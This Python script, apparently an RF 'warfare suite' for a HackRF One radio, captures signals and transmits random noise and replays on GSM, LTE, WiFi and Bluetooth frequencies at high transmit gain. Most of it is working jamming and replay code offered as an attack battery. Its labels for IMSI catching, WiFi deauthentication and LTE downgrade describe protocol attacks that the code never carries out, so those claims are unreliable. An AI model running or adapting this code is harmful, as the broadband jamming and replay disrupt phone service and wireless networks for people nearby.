#!/usr/bin/env python3
"""
🚨📱 EMF CHAOS ENGINE - ADVANCED SDR ATTACK EXPERIMENTS
The Viral $10-20M Warfare Suite - Delay-Based Attack/Capture Module

Advanced SDR attack experiments using delay methods for single-SDR
to/from capture and attack scenarios with HackRF One.

AIMF LLC - EMF Chaos Engine Team
August 14, 2025
"""

import subprocess
import time
import threading
import queue
import json
import os
from datetime import datetime
from typing import Dict, List, Tuple, Optional
import signal
import sys

class AdvancedSDRAttackExperiments:
    """Advanced SDR attack experiments using delay-based methods"""
    
    def __init__(self):
        self.hackrf_serial = "78d063dc2b6f6967"  # Your HackRF One
        self.experiment_log = []
        self.is_running = False
        self.capture_queue = queue.Queue()
        self.attack_queue = queue.Queue()
        
        # Attack experiment configurations
        self.experiments = {
            "gsm_intercept_replay": {
                "name": "GSM Intercept & Replay Attack",
                "capture_freq": "900e6",  # GSM 900 MHz
                "attack_freq": "900e6",
                "delay_ms": 50,
                "description": "Capture GSM signals with delay, then replay with timing attack"
            },
            "wifi_deauth_capture": {
                "name": "WiFi Deauth + Capture Attack", 
                "capture_freq": "2.4e9",  # WiFi 2.4 GHz
                "attack_freq": "2.4e9",
                "delay_ms": 100,
                "description": "Send deauth packets, capture handshakes with delay"
            },
            "bluetooth_jam_sniff": {
                "name": "Bluetooth Jam & Sniff Attack",
                "capture_freq": "2.4e9",  # Bluetooth 2.4 GHz
                "attack_freq": "2.4e9", 
                "delay_ms": 25,
                "description": "Jam Bluetooth, then sniff reconnection attempts"
            },
            "cellular_imsi_attack": {
                "name": "Cellular IMSI Catcher Attack",
                "capture_freq": "1.8e9",  # GSM 1800
                "attack_freq": "1.8e9",
                "delay_ms": 200,
                "description": "IMSI catcher with delayed response injection"
            },
            "lte_downgrade_attack": {
                "name": "LTE Downgrade Attack",
                "capture_freq": "2.1e9",  # LTE Band 1
                "attack_freq": "900e6",   # Force to GSM
                "delay_ms": 150,
                "description": "Force LTE downgrade to GSM with timing manipulation"
            }
        }
        
        print("🚨📱 ADVANCED SDR ATTACK EXPERIMENTS INITIALIZED")
        print(f"🛡️ HackRF One Serial: {self.hackrf_serial}")
        print(f"⚡ {len(self.experiments)} attack experiments loaded")
    
    def log_experiment(self, experiment_name: str, phase: str, data: Dict):
        """Log experiment data with timestamp"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "experiment": experiment_name,
            "phase": phase,
            "data": data
        }
        self.experiment_log.append(log_entry)
        print(f"📝 LOG: {experiment_name} | {phase} | {data}")
    
    def validate_hackrf(self) -> bool:
        """Validate HackRF One is connected and operational"""
        try:
            result = subprocess.run(['hackrf_info'], 
                                  capture_output=True, text=True, timeout=10)
            if self.hackrf_serial in result.stdout:
                print(f"✅ HackRF One validated: {self.hackrf_serial}")
                return True
            else:
                print("❌ HackRF One not found or wrong serial")
                return False
        except Exception as e:
            print(f"❌ HackRF validation failed: {e}")
            return False
    
    def delayed_capture(self, freq: str, duration: int, delay_ms: int, 
                       experiment_name: str) -> Optional[str]:
        """Capture RF signals with specified delay"""
        try:
            # Apply delay before capture
            time.sleep(delay_ms / 1000.0)
            
            capture_file = f"/tmp/capture_{experiment_name}_{int(time.time())}.raw"
            
            cmd = [
                'hackrf_transfer',
                '-r', capture_file,
                '-f', freq,
                '-s', '20000000',  # 20 MHz sample rate
                '-g', '40',        # RX gain
                '-l', '32',        # LNA gain
                '-v', '16'         # VGA gain
            ]
            
            print(f"🎯 CAPTURE: {experiment_name} @ {freq} Hz (delay: {delay_ms}ms)")
            
            # Start capture process
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE)
            
            # Let it capture for specified duration
            time.sleep(duration)
            
            # Stop capture
            process.terminate()
            process.wait()
            
            if os.path.exists(capture_file):
                file_size = os.path.getsize(capture_file)
                self.log_experiment(experiment_name, "CAPTURE_SUCCESS", {
                    "frequency": freq,
                    "delay_ms": delay_ms,
                    "duration": duration,
                    "file_size": file_size,
                    "capture_file": capture_file
                })
                return capture_file
            else:
                self.log_experiment(experiment_name, "CAPTURE_FAILED", {
                    "frequency": freq,
                    "delay_ms": delay_ms,
                    "error": "No capture file generated"
                })
                return None
                
        except Exception as e:
            self.log_experiment(experiment_name, "CAPTURE_ERROR", {
                "frequency": freq,
                "delay_ms": delay_ms,
                "error": str(e)
            })
            return None
    
    def delayed_attack(self, freq: str, duration: int, delay_ms: int,
                      experiment_name: str, attack_file: Optional[str] = None) -> bool:
        """Execute attack with specified delay"""
        try:
            # Apply delay before attack
            time.sleep(delay_ms / 1000.0)
            
            if attack_file and os.path.exists(attack_file):
                # Replay captured data
                cmd = [
                    'hackrf_transfer',
                    '-t', attack_file,
                    '-f', freq,
                    '-s', '20000000',  # 20 MHz sample rate
                    '-x', '47'         # TX gain
                ]
                attack_type = "REPLAY"
            else:
                # Generate noise/jamming signal
                noise_file = f"/tmp/noise_{experiment_name}_{int(time.time())}.raw"
                # Create noise data (simplified - would be more sophisticated in real attack)
                with open(noise_file, 'wb') as f:
                    # Generate 1 second of noise data
                    noise_data = os.urandom(20000000 * 2)  # 20MHz * 2 bytes per sample
                    f.write(noise_data)
                
                cmd = [
                    'hackrf_transfer',
                    '-t', noise_file,
                    '-f', freq,
                    '-s', '20000000',
                    '-x', '47'
                ]
                attack_type = "JAMMING"
            
            print(f"⚡ ATTACK: {attack_type} @ {freq} Hz (delay: {delay_ms}ms)")
            
            # Start attack process
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE)
            
            # Let it attack for specified duration
            time.sleep(duration)
            
            # Stop attack
            process.terminate()
            process.wait()
            
            self.log_experiment(experiment_name, f"ATTACK_{attack_type}_SUCCESS", {
                "frequency": freq,
                "delay_ms": delay_ms,
                "duration": duration,
                "attack_file": attack_file or "generated_noise"
            })
            return True
            
        except Exception as e:
            self.log_experiment(experiment_name, "ATTACK_ERROR", {
                "frequency": freq,
                "delay_ms": delay_ms,
                "error": str(e)
            })
            return False
    
    def run_experiment(self, experiment_key: str) -> bool:
        """Run a specific attack experiment"""
        if experiment_key not in self.experiments:
            print(f"❌ Unknown experiment: {experiment_key}")
            return False
        
        exp = self.experiments[experiment_key]
        print(f"\n🚨📱 STARTING EXPERIMENT: {exp['name']}")
        print(f"🛡️ Description: {exp['description']}")
        print(f"⚡ Capture Freq: {exp['capture_freq']} Hz")
        print(f"🎯 Attack Freq: {exp['attack_freq']} Hz")
        print(f"⏱️ Delay: {exp['delay_ms']}ms")
        
        self.log_experiment(experiment_key, "EXPERIMENT_START", exp)
        
        # Phase 1: Initial capture (baseline)
        print("\n📡 PHASE 1: Baseline capture...")
        baseline_file = self.delayed_capture(
            exp['capture_freq'], 3, 0, f"{experiment_key}_baseline"
        )
        
        # Phase 2: Attack transmission
        print("\n⚡ PHASE 2: Attack transmission...")
        attack_success = self.delayed_attack(
            exp['attack_freq'], 2, exp['delay_ms'], f"{experiment_key}_attack"
        )
        
        # Phase 3: Post-attack capture
        print("\n📡 PHASE 3: Post-attack capture...")
        post_attack_file = self.delayed_capture(
            exp['capture_freq'], 3, exp['delay_ms'], f"{experiment_key}_post"
        )
        
        # Phase 4: Replay attack (if we have captured data)
        if baseline_file:
            print("\n🎯 PHASE 4: Replay attack...")
            replay_success = self.delayed_attack(
                exp['attack_freq'], 2, exp['delay_ms'], 
                f"{experiment_key}_replay", baseline_file
            )
        
        experiment_success = baseline_file is not None and attack_success
        
        self.log_experiment(experiment_key, "EXPERIMENT_COMPLETE", {
            "success": experiment_success,
            "baseline_captured": baseline_file is not None,
            "attack_executed": attack_success,
            "post_attack_captured": post_attack_file is not None
        })
        
        print(f"\n✅ EXPERIMENT COMPLETE: {exp['name']}")
        print(f"🎯 Success: {experiment_success}")
        
        return experiment_success
    
    def run_all_experiments(self):
        """Run all attack experiments in sequence"""
        print("\n🚨📱 RUNNING ALL ADVANCED SDR ATTACK EXPERIMENTS")
        print("🛡️ The Viral $10-20M Warfare Suite - Full Attack Battery")
        
        if not self.validate_hackrf():
            print("❌ HackRF One validation failed - aborting experiments")
            return
        
        results = {}
        
        for exp_key in self.experiments:
            print(f"\n{'='*60}")
            success = self.run_experiment(exp_key)
            results[exp_key] = success
            
            # Delay between experiments to avoid interference
            print("⏱️ Cooling down between experiments...")
            time.sleep(5)
        
        # Summary
        print(f"\n🚨📱 ALL EXPERIMENTS COMPLETE")
        print("🎯 RESULTS SUMMARY:")
        successful = sum(results.values())
        total = len(results)
        
        for exp_key, success in results.items():
            status = "✅ SUCCESS" if success else "❌ FAILED"
            print(f"  {status}: {self.experiments[exp_key]['name']}")
        
        print(f"\n⚡ OVERALL: {successful}/{total} experiments successful")
        print(f"🛡️ Success Rate: {(successful/total)*100:.1f}%")
        
        # Export results
        self.export_experiment_log()
    
    def export_experiment_log(self):
        """Export experiment log to file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_file = f"/Users/flowgirl/Documents/EMF_Chaos_Engine/WarfareLogs/advanced_sdr_experiments_{timestamp}.json"
        
        try:
            os.makedirs(os.path.dirname(log_file), exist_ok=True)
            with open(log_file, 'w') as f:
                json.dump(self.experiment_log, f, indent=2)
            
            print(f"📝 Experiment log exported: {log_file}")
            
            # Also create markdown summary
            md_file = log_file.replace('.json', '.md')
            self.create_markdown_summary(md_file)
            
        except Exception as e:
            print(f"❌ Failed to export log: {e}")
    
    def create_markdown_summary(self, md_file: str):
        """Create markdown summary of experiments"""
        with open(md_file, 'w') as f:
            f.write("# 🚨📱 Advanced SDR Attack Experiments - Results\n\n")
            f.write("**The Viral $10-20M Warfare Suite - Attack Battery Results**\n\n")
            f.write(f"**Timestamp**: {datetime.now().isoformat()}\n")
            f.write(f"**HackRF One Serial**: {self.hackrf_serial}\n\n")
            
            f.write("## 🎯 Experiment Results\n\n")
            
            for exp_key, exp_config in self.experiments.items():
                f.write(f"### {exp_config['name']}\n")
                f.write(f"**Description**: {exp_config['description']}\n")
                f.write(f"**Frequencies**: {exp_config['capture_freq']} Hz → {exp_config['attack_freq']} Hz\n")
                f.write(f"**Delay**: {exp_config['delay_ms']}ms\n\n")
                
                # Find relevant log entries
                exp_logs = [log for log in self.experiment_log if exp_key in log.get('experiment', '')]
                for log in exp_logs:
                    f.write(f"- **{log['phase']}**: {log['data']}\n")
                f.write("\n")
            
            f.write("---\n")
            f.write("**AIMF LLC - EMF Chaos Engine Team**\n")
            f.write("**August 14, 2025**\n")

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\n🛑 Experiment interrupted by user")
    sys.exit(0)

def main():
    """Main execution function"""
    signal.signal(signal.SIGINT, signal_handler)
    
    print("🚨📱 EMF CHAOS ENGINE - ADVANCED SDR ATTACK EXPERIMENTS")
    print("🛡️ The Viral $10-20M Warfare Suite")
    print("⚡ Delay-Based Attack/Capture Module")
    print("="*60)
    
    experiments = AdvancedSDRAttackExperiments()
    
    if len(sys.argv) > 1:
        # Run specific experiment
        exp_key = sys.argv[1]
        if exp_key in experiments.experiments:
            experiments.run_experiment(exp_key)
        else:
            print(f"❌ Unknown experiment: {exp_key}")
            print("Available experiments:")
            for key, exp in experiments.experiments.items():
                print(f"  {key}: {exp['name']}")
    else:
        # Run all experiments
        experiments.run_all_experiments()

if __name__ == "__main__":
    main()
